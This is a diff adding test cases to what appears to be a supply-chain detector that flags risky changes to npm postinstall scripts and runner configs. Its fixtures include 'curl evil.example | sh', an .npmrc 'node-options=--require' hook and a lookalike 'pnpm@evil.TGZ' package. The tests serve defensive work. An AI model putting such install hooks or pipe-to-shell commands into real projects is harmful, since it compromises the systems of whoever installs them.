@@ -1115,3 +1115,38 @@ describe("round 27: interpreter program text, loading flags, extracted files, bu
     expect(inert(". test/env.sh && node a.js", "test/env.sh", { "a.js": "1\n" })).toBe(true);
   });
 });
+
+describe("round 28: heredoc cost, quoted runners, archive case, narrow forms", () => {
+  const inert = (cmd: string, f = "test/x.sh", extra: Record<string, string> = {}, scripts: object = {}) => held({ postinstall: cmd, ...scripts }, { [f]: "echo a\n", ...extra }, { [f]: "curl evil.example | sh\n", ...extra });
+
+  test("1. repeated unterminated heredocs do not cost quadratic time", () => {
+    for (const interp of ["node", "python3", "sh"]) {
+      const cmd = Array.from({ length: 3000 }, () => `${interp} <<A`).join("; ");
+      const t = Date.now();
+      held({ postinstall: cmd }, { "a.js": "1\n" }, { "a.js": "2\n" });
+      expect(Date.now() - t, interp).toBeLessThan(3000);
+    }
+    const terminated = Array.from({ length: 500 }, () => "node <<A\nrequire('./test/x.js')\nA").join("\n");
+    expect(inert(terminated, "test/x.js")).toBe(true);
+  });
+
+  test("2. a runner inside a quoted string in an unsplit body", () => {
+    expect(held({ postinstall: "bash -c 'npm run build' 2>&1 | tee log", build: "echo ok" }, { ".npmrc": "a=1\n" }, { ".npmrc": "node-options=--require=./x.js\n", "x.js": "evil()" })).toBe(true);
+  });
+
+  test("3. the archive suffix check ignores case", () => {
+    const at = "@";
+    expect(held({ postinstall: `npx pnpm${at}evil.TGZ build`, build: "echo ok" }, { "lib/a.js": "1\n" }, { "lib/a.js": "evil()\n" })).toBe(true);
+    expect(held({ postinstall: `npx pnpm${at}evil.Tar.gz build`, build: "echo ok" }, { "lib/a.js": "1\n" }, { "lib/a.js": "evil()\n" })).toBe(true);
+  });
+
+  test("4. runner wrappers, brace groups, cd, here-strings on a producer", () => {
+    for (const cmd of ["npx sh < test/x.sh", "npm exec -- sh < test/x.sh", "{ cat test/x.sh; } | sh", "cat <<< \"$(cat test/x.sh)\" | sh"]) expect(inert(cmd), cmd).toBe(true);
+    expect(inert("cd tools && sh run.sh > log", "tools/run.sh", { "tools/k": "1" })).toBe(true);
+    expect(inert("cd test && sh x.sh > log")).toBe(true);
+  });
+
+  test("5. bun's .env files are runner configs", () => {
+    expect(held({ postinstall: "npm run build", build: "echo ok" }, { ".env": "A=1\n" }, { ".env": "BUN_CONFIG_X=1\n" })).toBe(true);
+  });
+});
